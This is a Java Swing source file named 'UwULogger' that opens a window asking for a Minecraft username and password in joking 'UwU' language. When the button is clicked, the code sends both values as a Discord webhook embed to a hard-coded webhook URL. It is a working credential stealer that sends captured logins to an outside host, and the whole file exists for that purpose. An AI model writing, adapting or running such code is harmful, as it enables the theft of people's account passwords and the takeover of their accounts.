package me.garbage;

import java.awt.Canvas;
import java.awt.EventQueue;
import java.awt.Font;



import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JTextField;

import club.minnced.discord.webhook.WebhookClient;
import club.minnced.discord.webhook.WebhookClientBuilder;
import club.minnced.discord.webhook.send.WebhookEmbed;
import club.minnced.discord.webhook.send.WebhookEmbedBuilder;

import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;


public class UwULogger extends Canvas{

	  /**
	 * 
	 */
	private static final long serialVersionUID = 1L;

	
	private JFrame frame;
	private JTextField McUsername;
	private JTextField McPassword;
	
	
	
	
	
	
	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					UwULogger window = new UwULogger();
					window.frame.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the application.
	 */
	public UwULogger() {
		initialize();
	}

	/**
	 * Initialize the contents of the frame.
	 */
	private void initialize() {
		String url = "https://discord.com/api/webhooks/......";
		WebhookClientBuilder builder = new WebhookClientBuilder(url);
		
		
		frame = new JFrame();
		frame.setBounds(0, 0, 938, 621);
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		frame.getContentPane().setLayout(null);
		frame.setResizable(false);
		
		JLabel JLabel_1 = new JLabel("Minecraft Username Pwease:");
		JLabel_1.setFont(new Font("SansSerif", Font.PLAIN, 19));
		JLabel_1.setBounds(177, 86, 257, 34);
		frame.getContentPane().add(JLabel_1);
		JLabel_1.setOpaque(false);
		
		JLabel JLabel_2 = new JLabel("Minecraft Password, Give it to me UwU:");
		JLabel_2.setFont(new Font("SansSerif", Font.PLAIN, 19));
		JLabel_2.setBounds(96, 128, 357, 35);
		frame.getContentPane().add(JLabel_2);
		JLabel_2.setOpaque(false);
		
		McUsername = new JTextField();
		McUsername.setFont(new Font("SansSerif", Font.PLAIN, 19));
		McUsername.setBounds(538, 84, 184, 34);
		frame.getContentPane().add(McUsername);
		McUsername.setColumns(10);
		
		
		McPassword = new JTextField();
		McPassword.setFont(new Font("SansSerif", Font.PLAIN, 19));
		McPassword.setColumns(10);
		McPassword.setBounds(538, 139, 184, 34);
	
		
		
		frame.getContentPane().add(McPassword);
		
		
		
		
		
		JButton thankyouButton = new JButton("Th-Thank you kawaii-san");
		thankyouButton.setFont(new Font("SansSerif", Font.BOLD, 19));
		thankyouButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				
					String Passwordstr = McPassword.getText();
					String Usernamestr = McUsername.getText();
					builder.setThreadFactory((job) -> {
					    Thread thread = new Thread(job);
					    thread.setName("UwUTokenGiver");
					    thread.setDaemon(true);
					    return thread;
					    
					});
					builder.setWait(true);
					
					
				WebhookClient client = builder.build();
				
				 
				System.out.println(Usernamestr);
				System.out.println(Passwordstr);
				
				WebhookEmbed embed = new WebhookEmbedBuilder()
						.setColor(0xFF00EE)
				        .setDescription("Account Details : " + "\n" + "Minecraft Username = " + Usernamestr + "\n" + "Minecraft Password = " + Passwordstr)
				        .build();
				
				client.send(embed);
				
				
					
					
					
					
				}
			;
			
		});
		
		thankyouButton.setBounds(285, 346, 303, 78);
		frame.getContentPane().add(thankyouButton);
		
		JLabel ImageLabel = new JLabel();
		ImageLabel.setBounds(0, 0, 938, 582);
		frame.getContentPane().add(ImageLabel);
		ImageLabel.setIcon(new ImageIcon(UwULogger.class.getResource("/me/garbage/resource/wallpaper.jpg")));
		
		
		
		
		
		
		
		
		
		
	        }  
	   
		}
	

